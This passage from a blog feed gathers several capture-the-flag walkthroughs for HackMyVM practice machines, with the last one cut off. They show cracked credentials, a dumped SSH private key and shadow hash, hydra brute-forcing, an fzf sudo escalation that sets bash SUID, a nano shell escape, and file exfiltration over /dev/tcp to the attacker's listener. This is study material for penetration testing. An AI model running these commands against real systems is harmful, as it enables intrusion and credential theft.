smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
bela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
bela:!:19472:0:99999:7:::
                                 
┌──(kali㉿kali)-[~/test/tmp/etc]
└─$ cd ..                                
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls la 
ls: 无法访问 'la': 没有那个文件或目录
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls -la
总计 24
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
drwx------ 2 kali kali 4096 2023年 4月25日 root
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd home 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ ls -al
总计 12
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 .
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 bela
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ cd bela 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ l -al 
总计 16
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ./
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ../
-rw------- 1 kali kali   57 2023年 4月25日 .ash_history
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .ssh/
-rwxr-xr-x 1 kali kali    0 1969年12月31日 .wh..wh..opq*
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ cat .ash_history                     
pwd
ls -la
mkdir .ssh
cd .ssh
nano id_rsa
vi id_rsa
exit
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ cat .wh..wh..opq
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ cd .ssh       
                                                                                                                                     
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ls -al
总计 12
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ..
-rw-r--r-- 1 kali kali 2635 2023年 4月25日 id_rsa
                                                                                                                                     
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ cat id_rsa    
-----BEGIN OPENSSH PRIVATE KEY-----
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
VtVwCw==
-----END OPENSSH PRIVATE KEY-----
                                             
```

省了，都不用爆破shadow了

```
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh2john id_rsa &gt; hash
                                         
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:24 0.05% (ETA: 2025-01-31 17:41) 0g/s 105.4p/s 105.4c/s 105.4C/s passat..kicker
0g 0:00:01:39 0.06% (ETA: 2025-01-31 17:26) 0g/s 105.9p/s 105.9c/s 105.9C/s strokes..jhoan

```

爆破不出来，不会是用这个吧

![image](assets/image-20250129204242-qkg0s6r.png)

试试

```
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ chmod 600 id_rsa 

┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh bela@192.168.72.129 -i id_rsa
ssh: connect to host 192.168.72.129 port 22: No route to host
                                                                                                                                     
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh bela@192.168.72.129 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
bela@doll:~$ id
uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

# 3.提权

```
bela@doll:~$ sudo -l
Matching Defaults entries for bela on doll:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bela may run the following commands on doll:
    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337

```

​`fzf`​ 是一个交互式命令行模糊查找工具，并且其 `--listen`​ 选项允许它接收来自远程连接的命令。`fzf`​ 支持 `execute`​ 绑定，我们可以通过它来执行任意命令，包括启动 `bash`​ 或 `sh`​ 以获取 root shell。

```
bela@doll:~$ sudo /usr/bin/fzf --listen=1337
```

去重新登录一个窗口

```
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh bela@192.168.72.129 -i id_rsa   
Enter passphrase for key 'id_rsa': 
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan 30 02:44:26 2025 from 192.168.72.128

bela@doll:~$ curl -X POST --data '{'call':'execute','args':['chmod u+s /bin/bash']}' http://127.0.0.1:1337
unknown action: {'call':'execute','args':['/bin/bash']}
bela@doll:~$ curl -X POST --data 'execute(chmod u+s /bin/bash)' http://127.0.0.1:1337

```

成功拿到root shell

```
bela@doll:~$ bash -p
bash-5.1# id
uid=1000(bela) gid=1000(bela) euid=0(root) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

‍sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Doll.html</guid><pubDate>Fri, 27 Jun 2025 09:33:03 +0000</pubDate></item><item><title>hmv_Deeper</title><link>https://7r1UMPHK.github.io/post/hmv_Deeper.html</link><description># hmv_Deeper

# 0.简介

**靶机**：[hackmyvm - Deeper](https://hackmyvm.eu/machines/machine.php?vm=Deeper)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:34 CST
Nmap scan report for 192.168.205.143
Host is up (0.00046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:49:23:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
```

# 2.踩点

![Image](https://github.com/user-attachments/assets/91ecf9bd-ad4e-46cc-a738-92bfc7524a8b)

加上

![Image](https://github.com/user-attachments/assets/a2ee96a4-dce7-48ce-b94c-68125e7b3459)

![Image](https://github.com/user-attachments/assets/f7e4d481-8c35-47be-ba4d-88c63577b3c6)

![Image](https://github.com/user-attachments/assets/6ca74cb9-75f8-49fe-8abb-fb13d0bd5c02)

解码（[cyberchef](https://cyberchef.org/)）

![Image](https://github.com/user-attachments/assets/5a25d1be-e84d-4793-948c-0a3678f8ceaa)

![Image](https://github.com/user-attachments/assets/c68825cd-5fbd-459d-aed3-0a45900572b1)

# 3.提权

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh alice@192.168.205.143                                             
The authenticity of host '192.168.205.143 (192.168.205.143)' can't be established.
ED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.143' (ED25519) to the list of known hosts.
alice@192.168.205.143's password: 
Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
alice@deeper:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
alice@deeper:~$ sudo -l
[sudo] password for alice: 
Sorry, user alice may not run sudo on deeper.
alice@deeper:~$ ls -la
total 32
drwxr--r-- 3 alice alice 4096 Aug 26  2023 .
drwxr-xr-x 4 root  root  4096 Aug 25  2023 ..
lrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 alice alice  220 Aug 25  2023 .bash_logout
-rw-r--r-- 1 alice alice 3526 Aug 25  2023 .bashrc
-rw-r--r-- 1 alice alice   41 Aug 25  2023 .bob.txt
drwxr-xr-x 3 alice alice 4096 Aug 26  2023 .local
-rw-r--r-- 1 alice alice  807 Aug 25  2023 .profile
-rw-r--r-- 1 alice alice   33 Aug 26  2023 user.txt
alice@deeper:~$ cat .bob.txt
535746745247566c634556756233566e61413d3d

```

![Image](https://github.com/user-attachments/assets/6cba623b-f063-4b85-93e5-72e751571700)

```bash
alice@deeper:/home$ su - bob
Password: 
bob@deeper:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@deeper:~$ sudo -l
[sudo] password for bob: 
Sorry, user bob may not run sudo on deeper.
bob@deeper:~$ ls -la
total 28
drwxr--r-- 3 bob  bob  4096 Aug 26  2023 .
drwxr-xr-x 4 root root 4096 Aug 25  2023 ..
lrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 bob  bob   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 bob  bob  3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 bob  bob  4096 Aug 25  2023 .local
-rw-r--r-- 1 bob  bob   807 Aug 25  2023 .profile
-rw-r--r-- 1 bob  bob   215 Aug 26  2023 root.zip
bob@deeper:~$ cat root.zip &gt; /dev/tcp/192.168.205.141/7777

#kali
┌──(kali㉿kali)-[~/test/tmp]
└─$ nc -lvnp 7777 &gt; root.zip 
listening on [any] 7777 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 40706
                                                 
┌──(kali㉿kali)-[~/test/tmp]
└─$ zip2john root.zip &gt; hash                          
ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0
                                                                                                                                   
┌──(kali㉿kali)-[~/test/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                   
┌──(kali㉿kali)-[~/test/tmp]
└─$ john --show hash                                  
root.zip/root.txt:bob:root.txt:root.zip::root.zip

1 password hash cracked, 0 left                                              
                                 
┌──(kali㉿kali)-[~/test/tmp]
└─$ unzip root.zip
Archive:  root.zip
[root.zip] root.txt password: 
 extracting: root.txt                                                                                                                                               
                                                                                                                                 
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat root.txt
root:IhateMyPassword
                                
```

登录root

```bash
bob@deeper:~$ su -
Password: 
root@deeper:~# id
uid=0(root) gid=0(root) groups=0(root)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Deeper.html</guid><pubDate>Fri, 27 Jun 2025 09:33:00 +0000</pubDate></item><item><title>hmv_Darkside</title><link>https://7r1UMPHK.github.io/post/hmv_Darkside.html</link><description># hmv_Darkside

# 0.简介

**靶机**：[hackmyvm - Darkside](https://hackmyvm.eu/machines/machine.php?vm=Darkside)
**难度**：绿色
**目标 IP**：192.168.205.134
**本机 IP**：192.168.205.141

# 1.扫描

一号男嘉宾，`nmap`开扫

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.134
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 10:42 CST
Nmap scan report for 192.168.205.134
Host is up (0.00078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:2D:1C:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds                                                 
```

优先查看**http服务**端口，**ssh端口**如果没有进展再进行爆破

# 2.踩点

![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)

是个登录页，尝试`sql注入、万能密码、弱密码`均无果，使用`Nikto`进行WEB漏洞扫描

```bash
┌──(kali㉿kali)-[~/test]
└─$ nikto -h 192.168.205.134                       
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.205.134
+ Target Hostname:    192.168.205.134
+ Target Port:        80
+ Start Time:         2025-01-14 10:43:28 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /backup/: Directory indexing found.
+ /backup/: This might be interesting.
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-01-14 10:43:50 (GMT8) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

有个备份目录，我们去网页查看一下

![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)

只有一个`vote.txt`文本文件，给了我们几个用户名，我们拿这几个用户名去尝试爆破ssh服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.134/backup/vote.txt|awk -F ':' '{print $1}'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   205  100   205    0     0  69751      0 --:--:-- --:--:-- --:--:--  100k
rijaba
xerosec
sml
cromiphi
gatogamer
chema
talleyrand
d3b0o

Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ vim user  
                                      
┌──(kali㉿kali)-[~/test]
└─$ cat user
rijaba
xerosec
sml
cromiphi
gatogamer
chema
talleyrand
d3b0o
kevin
                  
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.134 -I -u -f -e nsr -t 64 

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 11:04:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 45027 login tries (l:9/p:5003), ~704 tries per task
[DATA] attacking ssh://192.168.205.134:22/

```

爆破的同时，我们用burp也爆破登录页

![image](https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9)

选这个，设置好参数后启动爆破

![image](https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7)

按照长度排序，可以发现该组用户密码长度明细不一样，尝试登录

![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)

获得了一串类似于base64的字符串，拿去[cyberchef](https://cyberchef.org/)解密

![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)

（尴尬了，是base58）输出了一串和网址很像的字符串，我们访问一下

![image](https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93)

问我们选哪边，我们查看源码

![image](https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10)

代码是实现了当存在名为 **side** 的 **cookie** 并且它的值是 `darkside`，那么脚本将重定向用户到 URL `hwvhysntovtanj.password`，我懒得改**cookie**了，我们直接访问

![image](https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce)

获得了一个貌似是**ssh服务**密码，我们尝试一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh kevin@192.168.205.134  
The authenticity of host '192.168.205.134 (192.168.205.134)' can't be established.
ED25519 key fingerprint is SHA256:pmPw9d2/o54jN+Dmo29Hq6rIzWOQ//VhyZvK4KN6rmk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.134' (ED25519) to the list of known hosts.
kevin@192.168.205.134's password: 
Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
kevin@darkside:~$ id
uid=1000(kevin) gid=1000(kevin) groups=1000(kevin)
```

成功连接

# 3.提权

```bash
kevin@darkside:~$ sudo -l
[sudo] password for kevin: 
Sorry, user kevin may not run sudo on darkside.
kevin@darkside:~$ 
kevin@darkside:~$ ls -la
total 32
drwxr-xr-x 3 kevin kevin 4096 Oct 30  2023 .
drwxr-xr-x 4 root  root  4096 Oct 15  2023 ..
lrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout
-rw-r--r-- 1 kevin kevin 3526 Oct 15  2023 .bashrc
-rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history
drwxr-xr-x 3 kevin kevin 4096 Oct 15  2023 .local
-rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile
-rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt
kevin@darkside:~$ cat .history
ls -al
hostname -I
echo 'Congratulations on the OSCP Xerosec'
top
ps -faux
su rijaba
ILoveJabita
ls /home/rijaba

```

在家目录发现了`.history`文本文件，查看获得了`rijaba`的密码，尝试登录

```bash
kevin@darkside:~$ su rijaba
Password: 
rijaba@darkside:/home/kevin$ id
uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
```

继续测试提权

```bash
rijaba@darkside:/home/kevin$ sudo -l
Matching Defaults entries for rijaba on darkside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rijaba may run the following commands on darkside:
    (root) NOPASSWD: /usr/bin/nano

```

可以使用**root**运行`nano`，我们进行提权

```bash
rijaba@darkside:/home/kevin$ sudo /usr/bin/nano
```

![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)

进入`nano`按**CTRL+R**，**CTRL+X**，输入`reset; sh 1&gt;&amp;0 2&gt;&amp;0`就提权成功了

![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Darkside.html</guid><pubDate>Fri, 27 Jun 2025 09:32:57 +0000</pubDate></item><item><title>hmv_crack</title><link>https://7r1UMPHK.github.io/post/hmv_crack.html</link><description># hmv_crack

# 0.简介

**靶机**：[hackmyvm - crack](https://hackmyvm.eu/machines/machine.php?vm=crack)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 15:51 CST
Nmap scan report for 192.168.205.143
Host is up (0.00043s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
4200/tcp  open  vrml-multi-use
12359/tcp open  unknown
MAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds

```

`4000、12359`是什么端口我们不知道，所以我们先看**ftp**端口

# 2.踩点

```bash
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.143                         
Connected to 192.168.205.143.
220 (vsFTPd 3.0.3)
Name (192.168.205.143:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||50526|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp&gt; cd upload
250 Directory successfully changed.
ftp&gt; ls
229 Entering Extended Passive Mode (|||30618|)
